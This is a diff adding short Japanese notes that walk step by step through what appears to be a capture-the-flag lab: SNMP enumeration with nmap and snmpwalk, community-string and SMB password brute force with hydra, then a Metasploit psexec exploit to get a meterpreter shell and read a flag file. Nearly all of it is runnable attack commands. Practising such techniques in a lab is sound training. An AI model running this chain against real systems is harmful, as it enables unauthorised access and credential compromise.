@@ -1,0 +1,30 @@
+SNMP分析
+1) ping -c 5 target
+2) nmap target
+3) nmapのデフォルトでは、UDPはチェックしないので、SNMPはUDPポート161で実行されているので、以下のコマンドで確認する
+nmap -sU -p 161 target
+4) 以下のコマンドで対象マシンのサービスにアクセスするためのコミュニティ文字列を見つける
+nmap -sU -p 161 --script=snmp-brute target
+5) snmpwalkツールを使って、SNMP経由で全ての情報を検索する
+snmpwalk -v 1 -c public target
+-v：使用するsnmpのバージョンを指定する
+-c：コミュニティ文字列を設定
+6) nmapを使用して、SNMPサービス経由で可能な限り全ての情報を収集する
+nmap -sU -p 161 --script snmp-* target > snmp_output
+ls
+7) 6)の結果を解析して、Windowsのユーザリストファイルであるusers.txtを作成
+8) hydraでブルートフォースを実行する
+hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target smb
+9) msfを用いてmeterpreterを取得する
+msfconsole -q
+use exploit/windows/smb/psexec
+show options
+set RHOSTS target
+set SMBUSER
+set SMBPASS
+exploit
+10) フラグの読み取り
+shell
+cd C:\
+dir
+type FLAG1.txt
